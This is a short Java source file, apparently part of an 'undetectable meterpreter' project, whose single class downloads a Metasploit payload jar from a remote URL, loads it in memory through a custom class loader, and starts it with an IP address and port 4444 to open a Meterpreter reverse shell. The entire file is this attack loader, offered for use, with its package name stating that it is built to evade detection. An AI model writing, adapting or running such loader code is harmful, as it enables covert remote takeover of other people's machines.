package java_undetectable_meterpreter;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import org.xeustechnologies.jcl.JarClassLoader;
import org.xeustechnologies.jcl.JclObjectFactory;

/**
 *
 * @author luisfontes19
 */
public class MeterpreterRemoveLoader {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IllegalArgumentException, SecurityException, MalformedURLException, IllegalAccessException, InvocationTargetException, NoSuchMethodException
    {
        JarClassLoader jcl = new JarClassLoader();

        //Loading classes from different sources
       
        jcl.add(new URL("http://url.com/meterpreter.jar"));
        JclObjectFactory factory = JclObjectFactory.getInstance();

        //Create object of loaded class
        Object obj = factory.create(jcl, "metasploit.Payload");
        Method meth = obj.getClass().getMethod("main", String[].class);
        String[] params = {"192.168.1.1","4444"};
        meth.invoke(null, (Object) params); 
        
    }
    
}
